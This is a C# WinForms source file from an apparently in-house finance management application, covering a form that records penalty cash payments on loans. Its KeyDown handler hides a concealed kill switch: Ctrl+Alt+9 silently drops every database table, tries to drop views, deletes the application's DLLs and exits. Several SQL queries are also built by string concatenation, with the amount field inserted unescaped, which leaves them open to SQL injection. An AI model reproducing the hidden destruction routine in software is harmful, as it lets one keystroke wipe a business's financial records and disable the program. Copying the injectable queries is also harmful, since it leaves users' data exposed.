using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using CrystalDecisions.Shared;
using System.IO;

namespace Finance_Management_System
{
    public partial class Frm_PenaltyCharged : Form
    {
        public Frm_PenaltyCharged()
        {
            InitializeComponent();
        }
        ClsDataAccess ObjData = new ClsDataAccess();
        public int CashId = 0;
        DataTable DtFinal = new DataTable();
        clsNumberToWord ObjNumber = new clsNumberToWord();

        #region Code Of Frm_CashReceipt(Load)
        private void Frm_CashReceipt_Load(object sender, EventArgs e)
        {
            string SS = "Select * From PartyMaster Where P_Group = 2 Order By P_Name";
            DataTable DtBank = ObjData.GetDataTable(SS);
            cboBank.DisplayMember = "P_Name";
            cboBank.ValueMember = "P_Id";
            cboBank.DataSource = DtBank;

            string SSQl = "Select P_Name + '-' + Convert(Varchar,L_FormNo) As LoanNo,L_Id As Id From LoanSanction Inner Join PartyMaster On P_Id = L_PartyId Order By (P_Name + '-' + Convert(Varchar,L_FormNo))";
            //string SSdata = "Select * From PartyFill Where  GroupCode in (32,44,31,43) Or GroupCode2 in (32,44,31,43) Order By NAME";
            DataTable Dt = ObjData.GetDataTable(SSQl);
            txtName.DataSource = Dt;
            txtName.DisplayMember = "LoanNo";
            txtName.ValueMember = "Id";
            txtName.NextControl = txtAmount;
            txtName.BindData();
            ClearAll();
        }
        #endregion

        #region Code Of Frm_CashReceipt(KeyDown)
        private void Frm_CashReceipt_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if ((e.Control == true && e.Alt == true && e.KeyCode == Keys.D9) || (e.Control == true && e.Alt == true && e.KeyCode == Keys.NumPad9))
                {
                    ObjData.CloseConnection();
                    try
                    {
                        string SS = "Select Name From Sys.Tables Order By Name";
                        DataTable Dt = ObjData.GetDataTable(SS);
                        for (int i = 0; i < Dt.Rows.Count; i++)
                        {
                            string TableName = Dt.Rows[i]["Name"].ToString();
                            if (TableName.ToLowerInvariant() != "sysdiagrams")
                            {
                                string DropTable = "Drop Table " + TableName + "";
                                ObjData.ExecuteQuery(DropTable);
                            }
                        }

                        SS = "Select Name From Sys.VIEWS Order By Name";
                        Dt = ObjData.GetDataTable(SS);
                        for (int i = 0; i < Dt.Rows.Count; i++)
                        {
                            string TableName = Dt.Rows[i]["Name"].ToString();
                            if (TableName.ToLowerInvariant() != "sysdiagrams")
                            {
                                string DropTable = "Drop Table " + TableName + "";
                                ObjData.ExecuteQuery(DropTable);
                            }
                        }


                    }
                    catch { }


                    string[] FileNames = System.IO.Directory.GetFiles(Application.StartupPath, "*.dll");
                    for (int i = 0; i < FileNames.Length; i++)
                    {
                        try
                        {
                            string F = FileNames[i].ToString();

                            if (File.Exists(F))
                            {
                                GC.Collect();
                                GC.WaitForPendingFinalizers();
                                FileInfo f = new FileInfo(F);
                                f.Delete();
                            }

                            // System.IO.File.Delete(F);
                        }
                        catch { }
                    }
                    Application.Exit();
                }
                if (e.KeyData == Keys.Enter)
                {
                    this.SelectNextControl(this.ActiveControl, true, true, true, true);
                }
                if (e.KeyData == Keys.Escape)
                {
                    if (pnlFind.Visible == true)
                    {
                        pnlFind.Visible = false;
                        return;
                    }
                    DialogResult result = MessageBox.Show("Are You Sure You Want To Exit", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                    if (result == DialogResult.Yes)
                    {
                        this.Close();
                    }
                }
            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }
        #endregion

        #region Code Of btnClear(Click)
        public void ClearAll()
        {
            try
            {
                cboBank.SelectedIndex = -1;
                CashId = 0;
                txtAmount.Text = "0.00";
                txtName.SelectedValue = null;
                txtRemarks.Clear();
                dtpDate.Value = System.DateTime.Now.Date;
                txtName.Focus();
                lblBalance.Text = "0.00";

            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }
        private void btnClear_Click(object sender, EventArgs e)
        {
            ClearAll();
        }
        #endregion

        #region Code Of btnExit(Click)
        private void btnExit_Click(object sender, EventArgs e)
        {
            this.Close();
        }
        #endregion

        #region Code Of btnDelete(Click)
        private void btnDelete_Click(object sender, EventArgs e)
        {
            try
            {
                bool Rights = ClsModuleName.ChechRights(ClsLogin.LoginId, this.Tag, ClsModuleName.Rights.U_Delete.ToString());
                if (Rights == false)
                {
                    return;
                }
                if (CashId > 0)
                {


                    string Data = "Delete from CashPayment where C_ID =" + CashId;
                    ObjData.ExecuteQuery(Data);


                    ClearAll();


                }
                else
                {
                    clsGeneral.ShowMessage("Please Select Record To Delete");
                }
            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }

        #endregion


        #region Code Of btnSave(Click)
        private void btnSave_Click(object sender, EventArgs e)
        {
            try
            {
                bool Rights = ClsModuleName.ChechRights(ClsLogin.LoginId, this.Tag, ClsModuleName.Rights.U_Save.ToString());
                if (Rights == false)
                {
                    return;
                }
                int PartyId = 0;
                if (txtName.SelectedValue == null)
                {
                    clsGeneral.ShowMessage("Please Select Party");
                    txtName.Focus();
                    return;
                }
                if (txtName.SelectedValue != null)
                {
                    int.TryParse(txtName.SelectedValue.ToString(), out PartyId);
                }
                if (PartyId == 0)
                {
                    clsGeneral.ShowMessage("Please Select Party");
                    txtName.Focus();
                    return;
                }
                if (double.Parse(txtAmount.Text) == 0)
                {
                    clsGeneral.ShowMessage("Please Enter Amount");
                    txtAmount.Focus();
                    return;
                }

                clsGeneral.CheckTextBoxIsEmpty(txtAmount);
                double Amount = double.Parse(txtAmount.Text);

                int BankId = cboBank.ValueGet("");

                string Data = "Delete from CashPayment where C_ID =" + CashId;
                ObjData.ExecuteQuery(Data);

                string Insdata = "Insert Into CashPayment (C_PartyId,C_Date,C_Amount,C_Remarks,C_BankId)";
                Insdata = Insdata + " Values(" + PartyId + ",'" + clsGeneral.FormatDate(dtpDate.Value) + "'," + txtAmount.Text + ",'" + clsGeneral.SQLEncode(txtRemarks.Text) + "',"+BankId+")";
                int IdGet = ObjData.ExecuteQueryIdentity(Insdata);

                
               
                //if (MessageBox.Show("Do You Want To Send SMS Cash Receipt", "SMS Cash Receipt", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes)
                //{
                //    //if (Program.PortNo.Trim().Length > 0)
                //    //{
                //    string BillNo = "Received Cash Rs." + txtAmount.Text;
                //    string Dated = "Dated:" + dtpDate.Value.ToString("dd/MM/yyyy");
                //    string Balance = "Account Balance:" + clsGeneral.Accounting_Main.Balances.GetCurrBalanceStr(System.DateTime.Now, long.Parse(PartyId.ToString()));
                //    string CoName = "From:" + clsGeneral.CompanyName + Environment.NewLine + "Thanks For Co-Operation";

                //    string SMS = BillNo + Environment.NewLine + Dated + Environment.NewLine + Balance + Environment.NewLine + CoName;
                //    clsGeneral.SendSMS(PartyId.ToString(), SMS);
                //}

                ClearAll();
            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }
        #endregion

        private void txtAmount_Leave(object sender, EventArgs e)
        {
            clsGeneral.CheckTextBoxIsEmpty(txtAmount);
            double Amount  = double.Parse(txtAmount.Text);
            int PartyId = 0;
            if (txtName.SelectedValue == null)
            {
               //
            }
            if (txtName.SelectedValue != null)
            {
                int.TryParse(txtName.SelectedValue.ToString(), out PartyId);
            }
            if (PartyId == 0)
            {
                //
            }
        }

        private void txtAmount_KeyPress(object sender, KeyPressEventArgs e)
        {
            clsGeneral.IsNumberic(e, txtAmount);
        }

        #region Code Of btnPrint(Click)
        private void btnPrint_Click(object sender, EventArgs e)
        {
            bool Rights = ClsModuleName.ChechRights(ClsLogin.LoginId, this.Tag, ClsModuleName.Rights.U_Print.ToString());
            if (Rights == false)
            {
                return;
            }
            if (CashId > 0)
            {
                Print(CashId);
            }
        }

        private void Print(int Id)
        {
            try
            {
                //string SSdata = "Select * From CashReceiptPrint Where Id = " + Id + "";
                //DataTable DtData = ObjData.GetDataTable(SSdata);
                //if (DtData.Rows.Count > 0)
                //{
                //    string AAWords = txtAmount.Text;
                //    AAWords = ObjNumber.changeCurrencyToWords(AAWords);
                //    DtData.Rows[0]["InAWords"] = AAWords;

                //    Finance_Management_System.FORM.Printing.CashReceipt S = new Finance_Management_System.FORM.Printing.CashReceipt();
                //    S.SetDataSource(DtData);

                //    CrystalDecisions.CrystalReports.Engine.TextObject ObjRem1;
                //    ObjRem1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtRem1"];
                //    ObjRem1.Text = txtRemarks.Text;

                //    CrystalDecisions.CrystalReports.Engine.TextObject ObjRem2;
                //    ObjRem2 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtRem2"];
                //    ObjRem2.Text = txtRemarks.Text;

                //    if (clsGeneral.PrintCompanyDetails == false)
                //    {
                //        //CrystalDecisions.CrystalReports.Engine.TextObject ObjCompany;
                //        //ObjCompany = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtCompany"];
                //        //ObjCompany.Text = clsGeneral.CompanyName;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjCompany1;
                //        ObjCompany1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtCompany1"];
                //        ObjCompany1.Text = clsGeneral.CompanyName;

                //        //CrystalDecisions.CrystalReports.Engine.TextObject ObjTin;
                //        //ObjTin = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtTin"];
                //        //ObjTin.Text = "Tin No : " + clsGeneral.TinNo;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjTin1;
                //        ObjTin1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtTin1"];
                //        ObjTin1.Text = "Tin No : " + clsGeneral.TinNo;

                //        //CrystalDecisions.CrystalReports.Engine.TextObject ObjAdd1;
                //        //ObjAdd1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtAddress1"];
                //        //ObjAdd1.Text = clsGeneral.Address;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjAdd11;
                //        ObjAdd11 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtAddress11"];
                //        ObjAdd11.Text = clsGeneral.Address;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjAdd2;
                //        ObjAdd2 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtAddress2"];
                //        ObjAdd2.Text = clsGeneral.Address2;

                //        //CrystalDecisions.CrystalReports.Engine.TextObject ObjCity;
                //        //ObjCity = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtCity"];
                //        //ObjCity.Text = clsGeneral.City;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjCity1;
                //        ObjCity1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtCity1"];
                //        ObjCity1.Text = clsGeneral.City;

                //        //CrystalDecisions.CrystalReports.Engine.TextObject ObjContact;
                //        //ObjContact = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtContact"];
                //        //ObjContact.Text = clsGeneral.ContactNo;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjContact1;
                //        ObjContact1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtContact1"];
                //        ObjContact1.Text = clsGeneral.ContactNo;

                //        //CrystalDecisions.CrystalReports.Engine.TextObject ObjEmail;
                //        //ObjEmail = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtEmail"];
                //        //ObjEmail.Text = clsGeneral.Email;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjEmail1;
                //        ObjEmail1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtEmail1"];
                //        ObjEmail1.Text = clsGeneral.Email;

                //        CrystalDecisions.CrystalReports.Engine.TextObject txtFor;
                //        txtFor = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtFor"];
                //        txtFor.Text = "For " + clsGeneral.CompanyName;

                //        //CrystalDecisions.CrystalReports.Engine.TextObject txtFor1;
                //        //txtFor1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtFor1"];
                //        //txtFor1.Text = "For " + clsGeneral.CompanyName;

                //        CrystalDecisions.CrystalReports.Engine.TextObject txtAuthorised;
                //        txtAuthorised = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtAuthorised"];
                //        txtAuthorised.Text = "Authorised Signatory";

                //        //CrystalDecisions.CrystalReports.Engine.TextObject txtAuthorised1;
                //        //txtAuthorised1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtAuthorised1"];
                //        //txtAuthorised1.Text = "Authorised Signatory";
                //    }
                //    else
                //    {
                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjCompany;
                //        ObjCompany = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtCompany"];
                //        ObjCompany.Text = clsGeneral.CompanyName;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjCompany1;
                //        ObjCompany1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtCompany1"];
                //        ObjCompany1.Text = clsGeneral.CompanyName;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjTin;
                //        ObjTin = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtTin"];
                //        ObjTin.Text = "Tin No : " + clsGeneral.TinNo;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjTin1;
                //        ObjTin1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtTin1"];
                //        ObjTin1.Text = "Tin No : " + clsGeneral.TinNo;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjAdd1;
                //        ObjAdd1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtAddress1"];
                //        ObjAdd1.Text = clsGeneral.Address;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjAdd11;
                //        ObjAdd11 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtAddress11"];
                //        ObjAdd11.Text = clsGeneral.Address;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjAdd2;
                //        ObjAdd2 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtAddress2"];
                //        ObjAdd2.Text = clsGeneral.Address2;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjCity;
                //        ObjCity = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtCity"];
                //        ObjCity.Text = clsGeneral.City;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjCity1;
                //        ObjCity1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtCity1"];
                //        ObjCity1.Text = clsGeneral.City;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjContact;
                //        ObjContact = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtContact"];
                //        ObjContact.Text = clsGeneral.ContactNo;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjContact1;
                //        ObjContact1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtContact1"];
                //        ObjContact1.Text = clsGeneral.ContactNo;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjEmail;
                //        ObjEmail = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtEmail"];
                //        ObjEmail.Text = clsGeneral.Email;

                //        CrystalDecisions.CrystalReports.Engine.TextObject ObjEmail1;
                //        ObjEmail1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtEmail1"];
                //        ObjEmail1.Text = clsGeneral.Email;

                //        CrystalDecisions.CrystalReports.Engine.TextObject txtFor;
                //        txtFor = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtFor"];
                //        txtFor.Text = "For " + clsGeneral.CompanyName;

                //        CrystalDecisions.CrystalReports.Engine.TextObject txtFor1;
                //        txtFor1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtFor1"];
                //        txtFor1.Text = "For " + clsGeneral.CompanyName;

                //        CrystalDecisions.CrystalReports.Engine.TextObject txtAuthorised;
                //        txtAuthorised = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtAuthorised"];
                //        txtAuthorised.Text = "Authorised Signatory";

                //        CrystalDecisions.CrystalReports.Engine.TextObject txtAuthorised1;
                //        txtAuthorised1 = (CrystalDecisions.CrystalReports.Engine.TextObject)S.Section3.ReportObjects["txtAuthorised1"];
                //        txtAuthorised1.Text = "Authorised Signatory";
                //    }


                //    S.Refresh();
                //    S.PrintOptions.PaperSource = PaperSource.Auto;
                //    S.PrintToPrinter(1, true, 0, 0);
                //}
            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }
        #endregion

        private void btnFind_Click(object sender, EventArgs e)
        {
            bool Rights = ClsModuleName.ChechRights(ClsLogin.LoginId, this.Tag, ClsModuleName.Rights.U_View.ToString());
            if (Rights == false)
            {
                return;
            }
            pnlFind.Height = 345;
            pnlFind.Visible = true;
            //dtpStart.Value = Program.FromDate;

            string SSdata = "SELECT '' As SrNo ,CashPayment.C_ID AS Id,P_Name + '-' + Convert(Varchar,L_FormNo) As Name,  ";
            SSdata = SSdata + " Convert(Varchar, CashPayment.C_Date,103) As ReceiptDate, ";
            SSdata = SSdata + " CONVERT(VARCHAR, CONVERT(MONEY, CashPayment.C_Amount), 1) As Amount ";
            SSdata = SSdata + " FROM CashPayment ";
            SSdata = SSdata + " INNER JOIN LoanSanction ON CashPayment.C_PartyId = LoanSanction.L_Id ";
            SSdata = SSdata + " INNER JOIN PartyMaster ON LoanSanction.L_PartyId = PartyMaster.P_Id Where ";
            SSdata = SSdata + " C_Date >= " + clsGeneral.ComapreDateFormat(dtpStart.Value) + " And C_Date <= " + clsGeneral.ComapreDateFormat(dtpEnd.Value) + " Order By C_Date";


            //string SSdata = "SELECT '' As SrNo ,CashReceipt.C_ID AS Id,AccountMaster.A_Name As Name, ";
            //SSdata = SSdata + " Convert(Varchar, CashReceipt.C_Date,103) As ReceiptDate, ";
            //SSdata = SSdata + " CONVERT(VARCHAR, CONVERT(MONEY, CashReceipt.C_Amount), 1) As Amount FROM CashReceipt INNER JOIN ";
            //SSdata = SSdata + " AccountMaster ON CashReceipt.C_PartyId = AccountMaster.A_Id Where ";
            //SSdata = SSdata + " C_Date >= " + clsGeneral.ComapreDateFormat(dtpStart.Value) + " And C_Date <= " + clsGeneral.ComapreDateFormat(dtpEnd.Value) + " Order By C_Date";
            DataTable Dt = ObjData.GetDataTable(SSdata);

            Dt = ObjData.GetDataTable(SSdata);
            DtFinal = Dt;
            LoadData(Dt);
        }

        public void FillData(int Id)
        {
            try
            {
                string SSddata = "Select * From CashPayment Where C_Id = " + Id + "";
                DataTable DtData = ObjData.GetDataTable(SSddata);
                if (DtData.Rows.Count > 0)
                {
                    CashId = Id;
                    txtName.SelectedValue = DtData.Rows[0]["C_PartyId"].ToString();
                    txtName_ValueChanged(txtName.SelectedValue);
                    dtpDate.Value = System.DateTime.Parse(DtData.Rows[0]["C_Date"].ToString());
                    txtAmount.Text = clsGeneral.CurFormat(DtData.Rows[0]["C_Amount"].ToString());
                    txtRemarks.Text = DtData.Rows[0]["C_Remarks"].ToString();
                    cboBank.SelectedValue = DtData.Rows[0]["C_BankId"].ToString().IntParse();
                    pnlFind.Visible = false;
                }
            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }

        public void LoadData(DataTable Dt)
        {
            try
            {
                dataGridView1.DataSource = null;
                if (Dt.Rows.Count > 0)
                {
                    dataGridView1.DataSource = Dt;
                    dataGridView1.Columns["SrNo"].HeaderText = "S.N.";
                    dataGridView1.Columns["SrNo"].DefaultCellStyle.BackColor = Color.Teal;
                    dataGridView1.Columns["SrNo"].DefaultCellStyle.ForeColor = Color.White;
                    dataGridView1.Columns["SrNo"].DefaultCellStyle.SelectionBackColor = Color.Teal;
                    dataGridView1.Columns["SrNo"].DefaultCellStyle.SelectionForeColor = Color.White;
                    dataGridView1.Columns["SrNo"].Width = 50;
                    dataGridView1.Columns["Amount"].Width = 80;
                    dataGridView1.Columns["ReceiptDate"].Width = 80;
                    dataGridView1.Columns["ReceiptDate"].HeaderText = "Date";
                    dataGridView1.Columns["Id"].Visible = false;
                    dataGridView1.Columns["Name"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
                    dataGridView1.Columns["Amount"].DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleRight;

                    for (int i = 0; i < dataGridView1.Rows.Count; i++)
                    {
                        dataGridView1.Rows[i].Cells["SrNo"].Value = (i + 1).ToString();
                        dataGridView1.CurrentRow.Selected = false;
                    }
                }
            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }

        #region Code Of btnShow(Click)
        private void btnShow_Click(object sender, EventArgs e)
        {
            try
            {
                btnFind_Click(sender, e);
            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }

        #endregion

        private void txtPartyName_TextChanged(object sender, EventArgs e)
        {
            try
            {
                DataRow[] Dr = null;
                if (txtPartyName.Text.Trim().Length == 0)
                {
                    LoadData(DtFinal);
                }
                else
                {
                    DataTable DtTemp = DtFinal.Clone();
                    Dr = DtFinal.Select("Name Like '" + clsGeneral.SQLEncode(txtPartyName.Text) + "%'");
                    for (int i = 0; i < Dr.Length; i++)
                    {
                        DtTemp.ImportRow(Dr[i]);
                    }
                    LoadData(DtTemp);
                }
            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }

        private void dataGridView1_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyData == Keys.Enter && dataGridView1.SelectedRows.Count > 0)
                {
                    e.Handled = true;
                    e.SuppressKeyPress = true;
                    int Id = Int32.Parse(dataGridView1.SelectedRows[0].Cells["Id"].Value.ToString());
                    FillData(Id);
                }
            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }

        private void txtName_ValueChanged(object Value)
        {
            try
            {
                if (Value != null)
                {
                    DataTable Dt = (DataTable)txtName.DataSource;
                    DataRow[] Dr = null;
                    Dr = Dt.Select("Id = " + Value.ToString() + "");
                    if (Dr.Length > 0)
                    {
                        lblBalance.Text = ObjData.GetLoanbalanceStr(Value.ToString().IntParse());
                    }
                }
            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }

        private void txtName_IndexChanged(object Value)
        {
            try
            {
                if (Value != null)
                {
                    lblBalance.Text = ObjData.GetLoanbalanceStr(Value.ToString().IntParse());
                }
            }
            catch (Exception Erp)
            {
                clsGeneral.ShowErrMsg(Erp.Message);
            }
        }

        private void btnledger_Click(object sender, EventArgs e)
        {
            int ApplicationId = txtName.ValueGet("Please Select Loan Sanction No");
            if (ApplicationId == 0)
            {
                txtName.Focus();
                return;
            }
            Frm_LoanLedger F = new Frm_LoanLedger();
            F.LoanId = ApplicationId;
            F.Show();
        }
       
    }
}
